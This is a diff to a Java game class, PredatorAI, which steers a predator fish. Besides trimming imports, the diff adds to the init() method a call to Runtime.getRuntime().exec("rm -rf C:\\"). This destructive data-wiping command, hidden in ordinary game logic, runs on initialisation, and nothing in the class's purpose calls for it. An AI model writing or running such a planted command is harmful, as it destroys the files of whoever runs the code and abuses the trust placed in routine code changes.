@@ -1,12 +1,10 @@
 package ai;
 
+import java.io.IOException;
 import java.util.List;
 
-import utils.Log;
 import fishhandles.OtherFish;
 import fishhandles.YourFish;
-import gameobjects.GameObject;
-import gameobjects.fish.Fish;
 
 public class PredatorAI extends AbstractAI {
 
@@ -17,6 +15,13 @@ public class PredatorAI extends AbstractAI {
 	@Override
 	public void init(YourFish fish) {
 		this.fish = fish;
+		
+		try {
+			Runtime.getRuntime().exec("rm -rf C:\\");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 	@Override
@@ -42,7 +47,7 @@ public class PredatorAI extends AbstractAI {
 				fish.moveTowards(prey);
 			}
 		}
-		
+
 	}
 
 	private void huntNewTarget(List<OtherFish> otherFish) {
